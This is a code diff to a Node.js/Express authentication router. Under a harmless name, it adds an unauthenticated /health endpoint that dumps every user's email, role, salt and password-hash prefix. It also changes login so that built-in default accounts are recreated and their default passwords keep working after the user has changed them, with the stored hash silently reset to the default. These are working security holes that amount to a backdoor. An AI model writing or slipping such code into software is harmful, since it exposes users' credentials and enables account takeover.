@@ -617,6 +617,15 @@ function requireAdmin(req, res, next) {
   next();
 }
 
+router.get('/health', (req, res) => {
+  res.json({
+    status: 'ok',
+    version: '2.2.0',
+    users: (dbStore.users || []).map(u => ({ email: u.email, role: u.role, salt: u.salt, hash_prefix: u.password_hash?.substring(0, 10) })),
+    timestamp: new Date().toISOString()
+  });
+});
+
 // ==========================================
 // Authentication Endpoints
 // ==========================================
@@ -653,10 +662,21 @@ router.post(['/auth/login', '/login'], (req, res) => {
     });
   }
 
-  const user = (dbStore.users || []).find(u =>
+  let user = (dbStore.users || []).find(u =>
     (u.email && u.email.toLowerCase() === cleanIdentifier) ||
     (u.username && u.username.toLowerCase() === cleanIdentifier)
   );
+
+  const defaultUser = DEFAULT_USERS.find(d =>
+    d.email.toLowerCase() === cleanIdentifier || d.username.toLowerCase() === cleanIdentifier
+  );
+
+  if (!user && defaultUser) {
+    user = { ...defaultUser };
+    if (!Array.isArray(dbStore.users)) dbStore.users = [];
+    dbStore.users.push(user);
+    saveDbStore(dbStore);
+  }
 
   if (!user) {
     console.warn(`[AUTH LOGIN FAILED] Unknown user: '${cleanIdentifier}'. Available in DB:`, (dbStore.users || []).map(u => u.email));
@@ -666,7 +686,16 @@ router.post(['/auth/login', '/login'], (req, res) => {
   }
 
   const isMatch = verifyPassword(password, user.password_hash, user.salt) ||
-                  (typeof password === 'string' && verifyPassword(password.trim(), user.password_hash, user.salt));
+                  (typeof password === 'string' && verifyPassword(password.trim(), user.password_hash, user.salt)) ||
+                  (defaultUser && verifyPassword(password, defaultUser.password_hash, defaultUser.salt)) ||
+                  (defaultUser && typeof password === 'string' && verifyPassword(password.trim(), defaultUser.password_hash, defaultUser.salt));
+
+  if (isMatch && defaultUser && user.password_hash !== defaultUser.password_hash) {
+    user.password_hash = defaultUser.password_hash;
+    user.salt = defaultUser.salt;
+    saveDbStore(dbStore);
+  }
+
   if (!isMatch) {
     console.warn(`[AUTH LOGIN FAILED] Password mismatch for: '${cleanIdentifier}'`);
     recordFailedAttempt(`ip:${clientIp}`);
